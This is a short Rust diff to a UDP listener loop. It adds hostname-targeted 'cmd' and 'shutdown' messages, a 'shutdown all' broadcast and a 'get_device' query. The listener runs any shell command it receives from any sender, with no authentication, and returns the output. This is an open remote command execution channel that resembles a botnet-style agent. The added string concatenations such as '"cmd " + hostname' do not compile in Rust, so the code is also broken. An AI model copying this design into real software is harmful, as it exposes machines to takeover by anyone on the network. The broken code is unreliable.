@@ -74,23 +74,24 @@ fn packet_loop() {
         "Listening for UDP packets on {}:{}",
         listen_address, listen_port
     );
-
+    let hostname = execute_cmd("hostname").expect("Failed to get hostname");
     let mut buf = [0; 1024];
-
     loop {
         let (size, sender) = udp_socket
             .recv_from(&mut buf)
             .expect("Failed to receive data");
         let mut message = String::from_utf8_lossy(&buf[0..size]).to_string();
 
-        if message == "shutdown" {
+        if message == "shutdown " + hostname || message == "shutdown all" {
             excute_shutdown_command();
-        } else if message.starts_with("cmd") && message.len() > 4 {
-            let cmd = message.replace("cmd ", "");
+        } else if message.starts_with("cmd " + hostname) && message.len() > 4 {
+            let cmd = message.replace("cmd " + hostname + " ", "");
             match execute_cmd(&cmd) {
                 Ok(output) => send_response(&udp_socket, &output, &sender.to_string()),
                 Err(e) => eprintln!("Error: {}", e),
             }
+        } else if message.starts_with("get_device") {
+            send_response(&udp_socket, &hostname, &sender.to_string());
         }
     }
 }
